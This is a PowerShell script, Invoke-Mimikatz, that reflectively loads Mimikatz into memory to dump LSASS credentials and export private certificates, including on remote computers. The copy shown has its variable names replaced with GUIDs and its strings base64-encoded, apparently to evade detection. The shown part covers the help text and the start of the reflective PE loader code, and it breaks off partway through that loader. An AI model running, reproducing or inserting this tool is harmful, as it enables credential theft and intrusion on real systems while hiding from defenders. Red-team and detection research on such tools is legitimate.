﻿function Invoke-Mimikatz
{
<#
.SYNOPSIS
This script leverages Mimikatz 2.0 and Invoke-ReflectivePEInjection to reflectively load Mimikatz completely in memory. This allows you to do things such as
dump credentials without ever writing the mimikatz binary to disk. 
The script has a ComputerName parameter which allows it to be executed against multiple computers.
This script should be able to dump credentials from any version of Windows through Windows 8.1 that has PowerShell v2 or higher installed.
Function: Invoke-Mimikatz
Author: Joe Bialek, Twitter: @JosephBialek
Mimikatz Author: Benjamin DELPY `gentilkiwi`. Blog: http://blog.gentilkiwi.com. Email: benjamin@gentilkiwi.com. Twitter @gentilkiwi
License:  http://creativecommons.org/licenses/by/3.0/fr/
Required Dependencies: Mimikatz (included)
Optional Dependencies: None
Version: 1.5
ReflectivePEInjection version: 1.1
Mimikatz version: 2.0 alpha (2/16/2015)
.DESCRIPTION
Reflectively loads Mimikatz 2.0 in memory using PowerShell. Can be used to dump credentials without writing anything to disk. Can be used for any 
functionality provided with Mimikatz.
.PARAMETER DumpCreds
Switch: Use mimikatz to dump credentials out of LSASS.
.PARAMETER DumpCerts
Switch: Use mimikatz to export all private certificates (even if they are marked non-exportable).
.PARAMETER Command
Supply mimikatz a custom command line. This works exactly the same as running the mimikatz executable like this: mimikatz "privilege::debug exit" as an example.
.PARAMETER ComputerName
Optional, an array of computernames to run the script on.
	
.EXAMPLE
Execute mimikatz on the local computer to dump certificates.
Invoke-Mimikatz -DumpCerts
.EXAMPLE
Execute mimikatz on two remote computers to dump credentials.
Invoke-Mimikatz -DumpCreds -ComputerName @("computer1", "computer2")
.EXAMPLE
Execute mimikatz on a remote computer with the custom command "privilege::debug exit" which simply requests debug privilege and exits
Invoke-Mimikatz -Command "privilege::debug exit" -ComputerName "computer1"
.NOTES
This script was created by combining the Invoke-ReflectivePEInjection script written by Joe Bialek and the Mimikatz code written by Benjamin DELPY
Find Invoke-ReflectivePEInjection at: https://github.com/clymb3r/PowerShell/tree/master/Invoke-ReflectivePEInjection
Find mimikatz at: http://blog.gentilkiwi.com
.LINK
Blog: http://clymb3r.wordpress.com/
Benjamin DELPY blog: http://blog.gentilkiwi.com
Github repo: https://github.com/clymb3r/PowerShell
mimikatz Github repo: https://github.com/gentilkiwi/mimikatz
Blog on reflective loading: http://clymb3r.wordpress.com/2013/04/06/reflective-dll-injection-with-powershell/
Blog on modifying mimikatz for reflective loading: http://clymb3r.wordpress.com/2013/04/09/modifying-mimikatz-to-be-loaded-using-invoke-reflectivedllinjection-ps1/
#>
[CmdletBinding(DefaultParameterSetName="DumpCreds")]
Param(
	[Parameter(Position = 0)]
	[String[]]
	${c1ecb6b88f3f408caf6c588ef0b66012},
    [Parameter(ParameterSetName = "DumpCreds", Position = 1)]
    [Switch]
    ${a88afb30beee4dbdacb3a883bad3ed3e},
    [Parameter(ParameterSetName = "DumpCerts", Position = 1)]
    [Switch]
    ${cb7cc856a98d4d8a8f00c1b3a96884a8},
    [Parameter(ParameterSetName = "CustomCommand", Position = 1)]
    [String]
    ${adb799f1415d42b6953138b9c21d4fbc}
)
Set-StrictMode -Version 2
${42b7f380802a4ecb8f9c8da9d57b00ce} = {
	[CmdletBinding()]
	Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[String]
		${360960a075984de898e66eda1d968418},
        [Parameter(Position = 1, Mandatory = $true)]
		[String]
		${e56b8ae36bd44ada8ecc03c11b928101},
		[Parameter(Position = 2, Mandatory = $false)]
		[String]
		$FuncReturnType,
		[Parameter(Position = 3, Mandatory = $false)]
		[Int32]
		${52fc94f570444d679a0e79f6f1787ce8},
		[Parameter(Position = 4, Mandatory = $false)]
		[String]
		$ProcName,
        [Parameter(Position = 5, Mandatory = $false)]
        [String]
        ${bb61a355ebca4b4caf1b861559415a52}
	)
	Function Get-Win32Types
	{
		${c3c389d397344cdcb031960f029f7926} = New-Object System.Object
		${453766846d6a4e1581ba9e3574b6c0fa} = [AppDomain]::CurrentDomain
		${19495be975774c55be295c8f24ae4e09} = New-Object System.Reflection.AssemblyName($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAB5AG4AYQBtAGkAYwBBAHMAcwBlAG0AYgBsAHkA'))))
		${6f179f701fd2438182039e368c5d60a4} = ${453766846d6a4e1581ba9e3574b6c0fa}.DefineDynamicAssembly(${19495be975774c55be295c8f24ae4e09}, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
		${6d8532d17f8644369d653fb2b0b0f4ca} = ${6f179f701fd2438182039e368c5d60a4}.DefineDynamicModule($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAB5AG4AYQBtAGkAYwBNAG8AZAB1AGwAZQA='))), $false)
		${4d3b26e5cca545fe87182df4095ec5bb} = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
		${065aa676fc9640529d9c661c49eabd94} = ${6d8532d17f8644369d653fb2b0b0f4ca}.DefineEnum($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGMAaABpAG4AZQBUAHkAcABlAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))), [UInt16])
		${065aa676fc9640529d9c661c49eabd94}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAHQAaQB2AGUA'))), [UInt16] 0) | Out-Null
		${065aa676fc9640529d9c661c49eabd94}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQAzADgANgA='))), [UInt16] 0x014c) | Out-Null
		${065aa676fc9640529d9c661c49eabd94}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQB0AGEAbgBpAHUAbQA='))), [UInt16] 0x0200) | Out-Null
		${065aa676fc9640529d9c661c49eabd94}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('eAA2ADQA'))), [UInt16] 0x8664) | Out-Null
		${dd47098428424393a9a88a8ad1f24dba} = ${065aa676fc9640529d9c661c49eabd94}.CreateType()
		${c3c389d397344cdcb031960f029f7926} | Add-Member -MemberType NoteProperty -Name MachineType -Value ${dd47098428424393a9a88a8ad1f24dba}
		${065aa676fc9640529d9c661c49eabd94} = ${6d8532d17f8644369d653fb2b0b0f4ca}.DefineEnum($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGcAaQBjAFQAeQBwAGUA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))), [UInt16])
		${065aa676fc9640529d9c661c49eabd94}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ATgBUAF8ATwBQAFQASQBPAE4AQQBMAF8ASABEAFIAMwAyAF8ATQBBAEcASQBDAA=='))), [UInt16] 0x10b) | Out-Null
		${065aa676fc9640529d9c661c49eabd94}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ATgBUAF8ATwBQAFQASQBPAE4AQQBMAF8ASABEAFIANgA0AF8ATQBBAEcASQBDAA=='))), [UInt16] 0x20b) | Out-Null
		${6becacea128d4982b740c93a9d7eee7a} = ${065aa676fc9640529d9c661c49eabd94}.CreateType()
		${c3c389d397344cdcb031960f029f7926} | Add-Member -MemberType NoteProperty -Name MagicType -Value ${6becacea128d4982b740c93a9d7eee7a}
		${065aa676fc9640529d9c661c49eabd94} = ${6d8532d17f8644369d653fb2b0b0f4ca}.DefineEnum($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB1AGIAUwB5AHMAdABlAG0AVAB5AHAAZQA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))), [UInt16])
		${065aa676fc9640529d9c661c49eabd94}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBVAE4ASwBOAE8AVwBOAA=='))), [UInt16] 0) | Out-Null
		${065aa676fc9640529d9c661c49eabd94}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBOAEEAVABJAFYARQA='))), [UInt16] 1) | Out-Null
		${065aa676fc9640529d9c661c49eabd94}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBXAEkATgBEAE8AVwBTAF8ARwBVAEkA'))), [UInt16] 2) | Out-Null
		${065aa676fc9640529d9c661c49eabd94}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBXAEkATgBEAE8AVwBTAF8AQwBVAEkA'))), [UInt16] 3) | Out-Null
		${065aa676fc9640529d9c661c49eabd94}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBQAE8AUwBJAFgAXwBDAFUASQA='))), [UInt16] 7) | Out-Null
		${065aa676fc9640529d9c661c49eabd94}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBXAEkATgBEAE8AVwBTAF8AQwBFAF8ARwBVAEkA'))), [UInt16] 9) | Out-Null
		${065aa676fc9640529d9c661c49eabd94}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBFAEYASQBfAEEAUABQAEwASQBDAEEAVABJAE8ATgA='))), [UInt16] 10) | Out-Null
		${065aa676fc9640529d9c661c49eabd94}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBFAEYASQBfAEIATwBPAFQAXwBTAEUAUgBWAEkAQwBFAF8ARABSAEkAVgBFAFIA'))), [UInt16] 11) | Out-Null
		${065aa676fc9640529d9c661c49eabd94}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBFAEYASQBfAFIAVQBOAFQASQBNAEUAXwBEAFIASQBWAEUAUgA='))), [UInt16] 12) | Out-Null
		${065aa676fc9640529d9c661c49eabd94}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBFAEYASQBfAFIATwBNAA=='))), [UInt16] 13) | Out-Null
		${065aa676fc9640529d9c661c49eabd94}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBYAEIATwBYAA=='))), [UInt16] 14) | Out-Null
		${dd22fc91120d4a2095024406e77dc4da} = ${065aa676fc9640529d9c661c49eabd94}.CreateType()
		${c3c389d397344cdcb031960f029f7926} | Add-Member -MemberType NoteProperty -Name SubSystemType -Value ${dd22fc91120d4a2095024406e77dc4da}
		${065aa676fc9640529d9c661c49eabd94} = ${6d8532d17f8644369d653fb2b0b0f4ca}.DefineEnum($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABsAGwAQwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMAVAB5AHAAZQA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))), [UInt16])
		${065aa676fc9640529d9c661c49eabd94}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBFAFMAXwAwAA=='))), [UInt16] 0x0001) | Out-Null
		${065aa676fc9640529d9c661c49eabd94}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBFAFMAXwAxAA=='))), [UInt16] 0x0002) | Out-Null
		${065aa676fc9640529d9c661c49eabd94}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBFAFMAXwAyAA=='))), [UInt16] 0x0004) | Out-Null
		${065aa676fc9640529d9c661c49eabd94}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBFAFMAXwAzAA=='))), [UInt16] 0x0008) | Out-Null
		${065aa676fc9640529d9c661c49eabd94}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAXwBDAEgAQQBSAEEAQwBUAEUAUgBJAFMAVABJAEMAUwBfAEQAWQBOAEEATQBJAEMAXwBCAEEAUwBFAA=='))), [UInt16] 0x0040) | Out-Null
		${065aa676fc9640529d9c661c49eabd94}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAXwBDAEgAQQBSAEEAQwBUAEUAUgBJAFMAVABJAEMAUwBfAEYATwBSAEMARQBfAEkATgBUAEUARwBSAEkAVABZAA=='))), [UInt16] 0x0080) | Out-Null
		${065aa676fc9640529d9c661c49eabd94}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAXwBDAEgAQQBSAEEAQwBUAEUAUgBJAFMAVABJAEMAUwBfAE4AWABfAEMATwBNAFAAQQBUAA=='))), [UInt16] 0x0100) | Out-Null
		${065aa676fc9640529d9c661c49eabd94}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAQwBIAEEAUgBBAEMAVABFAFIASQBTAFQASQBDAFMAXwBOAE8AXwBJAFMATwBMAEEAVABJAE8ATgA='))), [UInt16] 0x0200) | Out-Null
		${065aa676fc9640529d9c661c49eabd94}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAQwBIAEEAUgBBAEMAVABFAFIASQBTAFQASQBDAFMAXwBOAE8AXwBTAEUASAA='))), [UInt16] 0x0400) | Out-Null
		${065aa676fc9640529d9c661c49eabd94}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAQwBIAEEAUgBBAEMAVABFAFIASQBTAFQASQBDAFMAXwBOAE8AXwBCAEkATgBEAA=='))), [UInt16] 0x0800) | Out-Null
		${065aa676fc9640529d9c661c49eabd94}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBFAFMAXwA0AA=='))), [UInt16] 0x1000) | Out-Null
		${065aa676fc9640529d9c661c49eabd94}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAQwBIAEEAUgBBAEMAVABFAFIASQBTAFQASQBDAFMAXwBXAEQATQBfAEQAUgBJAFYARQBSAA=='))), [UInt16] 0x2000) | Out-Null
		${065aa676fc9640529d9c661c49eabd94}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAQwBIAEEAUgBBAEMAVABFAFIASQBTAFQASQBDAFMAXwBUAEUAUgBNAEkATgBBAEwAXwBTAEUAUgBWAEUAUgBfAEEAVwBBAFIARQA='))), [UInt16] 0x8000) | Out-Null
		${2b7afcea43e44076ae3663c8e7b3e839} = ${065aa676fc9640529d9c661c49eabd94}.CreateType()
		${c3c389d397344cdcb031960f029f7926} | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value ${2b7afcea43e44076ae3663c8e7b3e839}
		${51a71380725d4b7a889b0453a31c6e35} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAEUAeABwAGwAaQBjAGkAdABMAGEAeQBvAHUAdAAsACAAUwBlAGEAbABlAGQALAAgAEIAZQBmAG8AcgBlAEYAaQBlAGwAZABJAG4AaQB0AA==')))
		${065aa676fc9640529d9c661c49eabd94} = ${6d8532d17f8644369d653fb2b0b0f4ca}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABBAFQAQQBfAEQASQBSAEUAQwBUAE8AUgBZAA=='))), ${51a71380725d4b7a889b0453a31c6e35}, [System.ValueType], 8)
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBpAHIAdAB1AGEAbABBAGQAZAByAGUAcwBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(4) | Out-Null
		${e4041524248349f4959abc935070a96e} = ${065aa676fc9640529d9c661c49eabd94}.CreateType()
		${c3c389d397344cdcb031960f029f7926} | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value ${e4041524248349f4959abc935070a96e}
		${51a71380725d4b7a889b0453a31c6e35} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${065aa676fc9640529d9c661c49eabd94} = ${6d8532d17f8644369d653fb2b0b0f4ca}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARgBJAEwARQBfAEgARQBBAEQARQBSAA=='))), ${51a71380725d4b7a889b0453a31c6e35}, [System.ValueType], 20)
		${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGMAaABpAG4AZQA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAFMAZQBjAHQAaQBvAG4AcwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAG0AZQBEAGEAdABlAFMAdABhAG0AcAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUwB5AG0AYgBvAGwAVABhAGIAbABlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAFMAeQBtAGIAbwBsAHMA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYATwBwAHQAaQBvAG4AYQBsAEgAZQBhAGQAZQByAA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMA'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${3cb53778ea2340439f20917b68e9ad27} = ${065aa676fc9640529d9c661c49eabd94}.CreateType()
		${c3c389d397344cdcb031960f029f7926} | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value ${3cb53778ea2340439f20917b68e9ad27}
		${51a71380725d4b7a889b0453a31c6e35} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAEUAeABwAGwAaQBjAGkAdABMAGEAeQBvAHUAdAAsACAAUwBlAGEAbABlAGQALAAgAEIAZQBmAG8AcgBlAEYAaQBlAGwAZABJAG4AaQB0AA==')))
		${065aa676fc9640529d9c661c49eabd94} = ${6d8532d17f8644369d653fb2b0b0f4ca}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ATwBQAFQASQBPAE4AQQBMAF8ASABFAEEARABFAFIANgA0AA=='))), ${51a71380725d4b7a889b0453a31c6e35}, [System.ValueType], 240)
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGcAaQBjAA=='))), ${6becacea128d4982b740c93a9d7eee7a}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAEwAaQBuAGsAZQByAFYAZQByAHMAaQBvAG4A'))), [Byte], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(2) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAEwAaQBuAGsAZQByAFYAZQByAHMAaQBvAG4A'))), [Byte], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(3) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAQwBvAGQAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(4) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASQBuAGkAdABpAGEAbABpAHoAZQBkAEQAYQB0AGEA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(8) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAVQBuAGkAbgBpAHQAaQBhAGwAaQB6AGUAZABEAGEAdABhAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(12) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAGQAcgBlAHMAcwBPAGYARQBuAHQAcgB5AFAAbwBpAG4AdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(16) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAZQBPAGYAQwBvAGQAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(20) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBtAGEAZwBlAEIAYQBzAGUA'))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(24) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdABpAG8AbgBBAGwAaQBnAG4AbQBlAG4AdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(32) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBBAGwAaQBnAG4AbQBlAG4AdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(36) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(40) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(42) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAEkAbQBhAGcAZQBWAGUAcgBzAGkAbwBuAA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(44) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAEkAbQBhAGcAZQBWAGUAcgBzAGkAbwBuAA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(46) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAFMAdQBiAHMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(48) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAFMAdQBiAHMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(50) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AMwAyAFYAZQByAHMAaQBvAG4AVgBhAGwAdQBlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(52) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASQBtAGEAZwBlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(56) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASABlAGEAZABlAHIAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(60) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGUAYwBrAFMAdQBtAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(64) | Out-Null
		(${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB1AGIAcwB5AHMAdABlAG0A'))), ${dd22fc91120d4a2095024406e77dc4da}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(68) | Out-Null
